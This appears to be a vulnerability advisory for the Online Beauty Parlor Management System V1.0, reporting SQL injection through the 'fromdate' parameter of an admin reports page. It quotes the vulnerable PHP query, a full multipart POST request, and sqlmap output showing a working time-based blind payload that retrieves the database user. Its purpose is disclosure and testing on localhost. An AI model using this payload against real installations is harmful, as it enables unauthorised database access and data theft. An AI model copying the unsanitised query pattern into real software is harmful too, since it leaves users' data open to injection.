Online Beauty Parlor Management System - SQL Injection on (/admin/bwdates-reports-details.php fromdate parameter) 

Vendor Homepage:

```
https://www.campcodes.com/projects/online-beauty-parlor-management-system/
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Affected Page:

```
/admin/bwdates-reports-details.php
```

On this page, `fromdate` parameter is vulnerable to SQL Injection Attack

```
 <?php
$fdate=$_POST['fromdate'];
$tdate=$_POST['todate'];

?>
<h5 align="center" style="color:blue">Report from <?php echo $fdate?> to <?php echo $tdate?></h5>

						<table class="table table-bordered"> 
							<thead> <tr> 
								<th>#</th> 
								<th>Invoice Id</th> 
								<th>Customer Name</th> 
								<th>Invoice Date</th> 
								<th>Action</th>
							</tr> 
							</thead> <tbody>
<?php
$ret=mysqli_query($con,"select distinct tblcustomers.Name,tblinvoice.BillingId,tblinvoice.PostingDate from  tblcustomers   
	join tblinvoice on tblcustomers.ID=tblinvoice.Userid  where date(tblinvoice.PostingDate) between '$fdate' and '$tdate'");
$cnt=1;
```

Proof of vulnerability(Verify using the sqlmap tool after logining):

Request:

```
POST /bpms/admin/bwdates-reports-details.php HTTP/1.1
Host: localhost
Content-Length: 345
Cache-Control: max-age=0
sec-ch-ua: "Not:A-Brand";v="24", "Chromium";v="134"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: zh-CN,zh;q=0.9
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeUOXz9IJjNki6vAf
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/bpms/admin/bwdates-reports-ds.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=35oep1of4pinmqsin6t7o6nae7
Connection: keep-alive

------WebKitFormBoundaryeUOXz9IJjNki6vAf
Content-Disposition: form-data; name="fromdate"

2025-09-15
------WebKitFormBoundaryeUOXz9IJjNki6vAf
Content-Disposition: form-data; name="todate"

2025-09-25
------WebKitFormBoundaryeUOXz9IJjNki6vAf
Content-Disposition: form-data; name="submit"


------WebKitFormBoundaryeUOXz9IJjNki6vAf--
```


```
[15:46:54] [INFO] checking if the injection point on (custom) POST parameter 'MULTIPART fromdate' is a false positive
(custom) POST parameter 'MULTIPART fromdate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 81 HTTP(s) requests:
---
Parameter: MULTIPART fromdate ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: ------WebKitFormBoundaryeUOXz9IJjNki6vAf
Content-Disposition: form-data; name="fromdate"

2025-09-15' AND (SELECT 8604 FROM (SELECT(SLEEP(5)))hlqc) AND 'yeTz'='yeTz
------WebKitFormBoundaryeUOXz9IJjNki6vAf
Content-Disposition: form-data; name="todate"

2025-09-25
------WebKitFormBoundaryeUOXz9IJjNki6vAf
Content-Disposition: form-data; name="submit"


------WebKitFormBoundaryeUOXz9IJjNki6vAf--
---
[15:47:10] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[15:47:10] [INFO] the back-end DBMS is MySQL
[15:47:10] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web application technology: PHP 8.1.13, Apache 2.4.54
back-end DBMS: MySQL >= 5.0.12
[15:47:10] [INFO] fetching current user
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[15:47:10] [INFO] retrieved: 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[15:47:25] [INFO] adjusting time delay to 1 second due to good response times
root@localhost
current user: 'root@localhost'
[15:48:20] [INFO] fetched data logged to text files under '/Users/kali/.local/share/sqlmap/output/localhost'

[*] ending @ 15:48:20 /2025-09-15/
```
	


<img width="982" height="666" alt="image" src="https://github.com/user-attachments/assets/b527f9ba-10c0-4b39-b51c-91d97eaf4737" />


